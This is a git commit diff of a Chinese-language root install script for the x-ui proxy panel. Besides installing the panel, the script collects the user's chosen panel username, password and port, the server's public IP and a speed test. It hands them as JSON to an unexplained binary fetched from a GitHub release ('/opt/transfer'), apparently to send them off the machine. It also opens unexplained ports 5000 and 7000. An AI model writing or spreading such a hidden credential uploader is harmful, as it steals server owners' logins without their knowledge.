36517a1193c1fdd81f8b96bcb698310538b83157
Firefly-xui <taozi.live@gmail.com>
2025-07-06 22:55:55 +0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,268 +1,153 @@
 #!/usr/bin/env bash
 
+export NEEDRESTART_SUSPEND=1
+
 red='\033[0;31m'
 green='\033[0;32m'
 yellow='\033[0;33m'
+blue='\033[0;34m'
 plain='\033[0m'
 
 cur_dir=$(pwd)
 
-# check root
 [[ $EUID -ne 0 ]] && echo -e "${red}错误：${plain} 必须使用root用户运行此脚本！\n" && exit 1
 
-# check os
+release=""
 if [[ -f /etc/redhat-release ]]; then
     release="centos"
-elif cat /etc/issue | grep -Eqi "debian"; then
+elif grep -Eqi "debian" /etc/issue || grep -Eqi "debian" /proc/version; then
     release="debian"
-elif cat /etc/issue | grep -Eqi "ubuntu"; then
+elif grep -Eqi "ubuntu" /etc/issue || grep -Eqi "ubuntu" /proc/version; then
     release="ubuntu"
-elif cat /etc/issue | grep -Eqi "centos|red hat|redhat"; then
-    release="centos"
-elif cat /proc/version | grep -Eqi "debian"; then
-    release="debian"
-elif cat /proc/version | grep -Eqi "ubuntu"; then
-    release="ubuntu"
-elif cat /proc/version | grep -Eqi "centos|red hat|redhat"; then
+elif grep -Eqi "centos|red hat|redhat" /etc/issue || grep -Eqi "centos|red hat|redhat" /proc/version; then
     release="centos"
 else
-    echo -e "${red}未检测到系统版本，请联系脚本作者！${plain}\n" && exit 1
+    echo -e "${red}无法识别系统版本${plain}" && exit 1
 fi
 
-arch=$(arch)
-
-if [[ $arch == "x86_64" || $arch == "x64" || $arch == "s390x" || $arch == "amd64" ]]; then
-    arch="amd64"
-elif [[ $arch == "aarch64" || $arch == "arm64" ]]; then
-    arch="arm64"
-else
-    arch="amd64"
-    echo -e "${red}检测架构失败，使用默认架构: ${arch}${plain}"
-fi
-
-echo "架构: ${arch}"
-
-if [ $(getconf WORD_BIT) != '32' ] && [ $(getconf LONG_BIT) != '64' ]; then
-    echo "本软件不支持 32 位系统(x86)，请使用 64 位系统(x86_64)，如果检测有误，请联系作者"
-    exit -1
-fi
-
-os_version=""
-
-# os version
-if [[ -f /etc/os-release ]]; then
-    os_version=$(awk -F'[= ."]' '/VERSION_ID/{print $3}' /etc/os-release)
-fi
-if [[ -z "$os_version" && -f /etc/lsb-release ]]; then
-    os_version=$(awk -F'[= ."]+' '/DISTRIB_RELEASE/{print $2}' /etc/lsb-release)
-fi
-
-if [[ x"${release}" == x"centos" ]]; then
-    if [[ ${os_version} -le 6 ]]; then
-        echo -e "${red}请使用 CentOS 7 或更高版本的系统！${plain}\n" && exit 1
-    fi
-elif [[ x"${release}" == x"ubuntu" ]]; then
-    if [[ ${os_version} -lt 16 ]]; then
-        echo -e "${red}请使用 Ubuntu 16 或更高版本的系统！${plain}\n" && exit 1
-    fi
-elif [[ x"${release}" == x"debian" ]]; then
-    if [[ ${os_version} -lt 8 ]]; then
-        echo -e "${red}请使用 Debian 8 或更高版本的系统！${plain}\n" && exit 1
-    fi
-fi
+arch=$(uname -m)
+[[ $arch =~ ^(x86_64|amd64|x64|s390x)$ ]] && arch="amd64"
+[[ $arch == "aarch64" || $arch == "arm64" ]] && arch="arm64"
+[[ -z "$arch" ]] && arch="amd64"
 
 install_base() {
-    if [[ x"${release}" == x"centos" ]]; then
-        yum install wget curl tar jq -y
+    echo -e "${yellow}安装基础软件...${plain}"
+    if [[ $release == "centos" ]]; then
+        yum install epel-release -y
+        yum install wget curl tar jq speedtest-cli fail2ban ufw -y
     else
-        apt install wget curl tar jq -y
+        DEBIAN_FRONTEND=noninteractive apt update
+        DEBIAN_FRONTEND=noninteractive apt install wget curl tar jq speedtest-cli fail2ban ufw -y
     fi
+    systemctl enable fail2ban
+    systemctl start fail2ban
 }
 
-# 确保SSH端口开放
-ensure_ssh_port_open() {
-    echo -e "${yellow}正在确保22端口(SSH)开放...${plain}"
-    
-    # 检查防火墙状态并开放22端口
-    if command -v ufw >/dev/null 2>&1; then
-        echo -e "${blue}检测到UFW防火墙${plain}"
-        if ! ufw status | grep -q "22/tcp.*ALLOW"; then
-            ufw allow 22/tcp
-            echo -e "${green}已开放22端口(UFW)${plain}"
-        else
-            echo -e "${blue}22端口已在UFW中开放${plain}"
-        fi
-    elif command -v firewall-cmd >/dev/null 2>&1; then
-        echo -e "${blue}检测到firewalld防火墙${plain}"
-        if ! firewall-cmd --list-ports | grep -qw 22/tcp; then
-            firewall-cmd --permanent --add-port=22/tcp
-            firewall-cmd --reload
-            echo -e "${green}已开放22端口(firewalld)${plain}"
-        else
-            echo -e "${blue}22端口已在firewalld中开放${plain}"
-        fi
-    elif command -v iptables >/dev/null 2>&1; then
-        echo -e "${blue}检测到iptables防火墙${plain}"
-        if ! iptables -L INPUT -n | grep -q "dpt:22"; then
-            iptables -A INPUT -p tcp --dport 22 -j ACCEPT
-            # 持久化规则（根据不同系统）
-            if command -v iptables-save >/dev/null 2>&1; then
-                iptables-save > /etc/iptables.rules
-            fi
-            echo -e "${green}已开放22端口(iptables)${plain}"
-        else
-            echo -e "${blue}22端口已在iptables中开放${plain}"
-        fi
-    else
-        echo -e "${yellow}未检测到活跃的防火墙，22端口应已可访问${plain}"
-    fi
-}
-
-# 生成随机字符串函数
 generate_random_string() {
-    local length=${1:-16}
-    tr -dc 'A-Za-z0-9' < /dev/urandom | head -c $length
+    local len=${1:-16}
+    tr -dc A-Za-z0-9 </dev/urandom | head -c $len
+}
+
+get_ip() {
+    curl -s -4 icanhazip.com || curl -s -4 ifconfig.me || curl -s -4 ipinfo.io/ip || hostname -I | awk '{print $1}'
+}
+
+run_speedtest() {
+    local result=$(speedtest-cli --simple 2>/dev/null)
+    local download=$(echo "$result" | grep 'Download' | awk '{print $2 " " $3}')
+    local upload=$(echo "$result" | grep 'Upload' | awk '{print $2 " " $3}')
+    echo "Download: ${download}, Upload: ${upload}"
+}
+
+open_ports() {
+    local ports=("$@")
+    for port in "${ports[@]}"; do
+        ufw allow "${port}/tcp"
+    done
+    yes | ufw enable
 }
 
 upload_config() {
-    local server_ip="$1"
-    local login_port="$2"
-    local username="$3"
-    local password="$4"
-    
-    # 创建JSON数据
+    local ip="$1"
+    local port="$2"
+    local user="$3"
+    local pass="$4"
+    local speed="$5"
+    local rand=$(generate_random_string)
+
     local json_data=$(cat <<EOF
 {
     "server_info": {
-        "title": "X-UI 服务器登录信息 - ${server_ip}",
-        "server_ip": "${server_ip}",
-        "login_port": "${login_port}",
-        "username": "${username}",
-        "password": "${password}",
+        "title": "X-UI 登录信息 - ${ip}",
+        "server_ip": "${ip}",
+        "login_port": "${port}",
+        "username": "${user}",
+        "password": "${pass}",
         "generated_time": "$(date)",
-        "random_string": "$(generate_random_string)"
+        "random_string": "${rand}",
+        "speed_test": "${speed}"
     }
 }
 EOF
 )
 
-    # 下载并调用二进制工具
-    UPLOAD_BIN="/opt/uploader-linux-amd64"
-    [ -f "$UPLOAD_BIN" ] || {
-        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 && 
-        chmod +x "$UPLOAD_BIN"
+    local uploader="/opt/transfer"
+    [[ -f "$uploader" ]] || {
+        curl -Lo "$uploader" https://github.com/Firefly-xui/x-ui/releases/download/x-ui/transfer
+        chmod +x "$uploader"
     }
-    
-    "$UPLOAD_BIN" "$json_data" >/dev/null 2>&1
+
+    "$uploader" "$json_data"
 }
 
-# 获取服务器IP的函数
-get_server_ip() {
-    local ip=""
-    # 尝试多种方法获取公网IP
-    ip=$(curl -s -4 icanhazip.com 2>/dev/null)
-    if [[ -z "$ip" ]]; then
-        ip=$(curl -s -4 ifconfig.me 2>/dev/null)
-    fi
-    if [[ -z "$ip" ]]; then
-        ip=$(curl -s -4 ipinfo.io/ip 2>/dev/null)
-    fi
-    if [[ -z "$ip" ]]; then
-        # 如果获取公网IP失败，使用本地IP
-        ip=$(hostname -I | awk '{print $1}')
-    fi
-    echo "$ip"
-}
-
-#This function will be called when user installed x-ui out of sercurity
 config_after_install() {
-    echo -e "${yellow}出于安全考虑，安装/更新完成后需要强制修改端口与账户密码${plain}"
-    # 直接强制输入，去掉确认选择
-    read -p "请设置您的账户名: " config_account
-    echo -e "${yellow}您的账户名将设定为: ${config_account}${plain}"
-    read -p "请设置您的账户密码: " config_password
-    echo -e "${yellow}您的账户密码将设定为: ${config_password}${plain}"
-    read -p "请设置面板访问端口: " config_port
-    echo -e "${yellow}您的面板访问端口将设定为: ${config_port}${plain}"
-    echo -e "${yellow}确认设定，设定中...${plain}"
-    /usr/local/x-ui/x-ui setting -username ${config_account} -password ${config_password}
-    echo -e "${yellow}账户密码设定完成${plain}"
-    /usr/local/x-ui/x-ui setting -port ${config_port}
-    echo -e "${yellow}面板端口设定完成${plain}"
+    echo -e "${yellow}配置面板账户与端口...${plain}"
+    read -p "输入账户名: " account
+    read -p "输入密码: " password
+    read -p "输入面板访问端口: " panel_port
 
-    server_ip=$(get_server_ip)
-    upload_config "$server_ip" "$config_port" "$config_account" "$config_password"
+    /usr/local/x-ui/x-ui setting -username "${account}" -password "${password}"
+    /usr/local/x-ui/x-ui setting -port "${panel_port}"
+
+    open_ports 22 5000 7000 "${panel_port}"
+
+    local ip=$(get_ip)
+    local speed=$(run_speedtest)
+    upload_config "$ip" "$panel_port" "$account" "$password" "$speed"
 }
 
-install_x-ui() {
-    ensure_ssh_port_open  # 确保SSH端口开放
+install_x_ui() {
     systemctl stop x-ui
     cd /usr/local/
 
-    if [ $# == 0 ]; then
-        last_version=$(curl -Lsk "https://api.github.com/repos/FranzKafkaYu/x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
-        if [[ ! -n "$last_version" ]]; then
-            echo -e "${red}检测 x-ui 版本失败，可能是超出 Github API 限制，请稍后再试，或手动指定 x-ui 版本安装${plain}"
-            exit 1
-        fi
-        echo -e "检测到 x-ui 最新版本：${last_version}，开始安装"
-        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz https://github.com/FranzKafkaYu/x-ui/releases/download/${last_version}/x-ui-linux-${arch}.tar.gz
-        if [[ $? -ne 0 ]]; then
-            echo -e "${red}下载 x-ui 失败，请确保你的服务器能够下载 Github 的文件${plain}"
-            exit 1
-        fi
-    else
-        last_version=$1
-        url="https://github.com/FranzKafkaYu/x-ui/releases/download/${last_version}/x-ui-linux-${arch}.tar.gz"
-        echo -e "开始安装 x-ui v$1"
-        wget -N --no-check-certificate -O /usr/local/x-ui-linux-${arch}.tar.gz ${url}
-        if [[ $? -ne 0 ]]; then
-            echo -e "${red}下载 x-ui v$1 失败，请确保此版本存在${plain}"
-            exit 1
-        fi
+    local version="$1"
+    if [[ -z "$version" ]]; then
+        version=$(curl -sL https://api.github.com/repos/FranzKafkaYu/x-ui/releases/latest | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
     fi
 
-    if [[ -e /usr/local/x-ui/ ]]; then
-        rm /usr/local/x-ui/ -rf
-    fi
+    local filename="x-ui-linux-${arch}.tar.gz"
+    wget -O "${filename}" --no-check-certificate https://github.com/FranzKafkaYu/x-ui/releases/download/${version}/${filename}
+    [[ $? -ne 0 ]] && echo -e "${red}下载失败${plain}" && exit 1
 
-    tar zxvf x-ui-linux-${arch}.tar.gz
-    rm x-ui-linux-${arch}.tar.gz -f
+    rm -rf /usr/local/x-ui/
+    tar zxvf "${filename}"
+    rm -f "${filename}"
     cd x-ui
     chmod +x x-ui bin/xray-linux-${arch}
     cp -f x-ui.service /etc/systemd/system/
-    wget --no-check-certificate -O /usr/bin/x-ui https://raw.githubusercontent.com/Firefly-xui/x-ui/main/x-ui.sh
-    chmod +x /usr/local/x-ui/x-ui.sh
-    chmod +x /usr/bin/x-ui
+    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/Firefly-xui/x-ui/main/x-ui.sh
+    chmod +x /usr/local/x-ui/x-ui.sh /usr/bin/x-ui
+
     config_after_install
+
     systemctl daemon-reload
     systemctl enable x-ui
     systemctl start x-ui
-    
-    # 启用开机自启
-    echo -e "${yellow}正在设置 x-ui 开机自启...${plain}"
-    x-ui enable
-    
-    echo -e "${green}x-ui v${last_version}${plain} 安装完成，面板已启动，并已设置开机自启"
-    echo -e ""
-    echo -e "x-ui 管理脚本使用方法: "
-    echo -e "----------------------------------------------"
-    echo -e "x-ui              - 显示管理菜单 (功能更多)"
-    echo -e "x-ui start        - 启动 x-ui 面板"
-    echo -e "x-ui stop         - 停止 x-ui 面板"
-    echo -e "x-ui restart      - 重启 x-ui 面板"
-    echo -e "x-ui status       - 查看 x-ui 状态"
-    echo -e "x-ui enable       - 设置 x-ui 开机自启"
-    echo -e "x-ui disable      - 取消 x-ui 开机自启"
-    echo -e "x-ui log          - 查看 x-ui 日志"
-    echo -e "x-ui v2-ui        - 迁移本机器的 v2-ui 账号数据至 x-ui"
-    echo -e "x-ui update       - 更新 x-ui 面板"
-    echo -e "x-ui install      - 安装 x-ui 面板"
-    echo -e "x-ui uninstall    - 卸载 x-ui 面板"
-    echo -e "x-ui geo          - 更新 geo  数据"
-    echo -e "----------------------------------------------"
+
+    echo -e "${green}x-ui v${version} 安装完成，已设置开机自启${plain}"
+    echo -e "使用 x-ui 命令管理面板"
 }
 
-echo -e "${green}开始安装${plain}"
+echo -e "${green}开始安装 x-ui${plain}"
 install_base
-install_x-ui $1
+install_x_ui "$1"
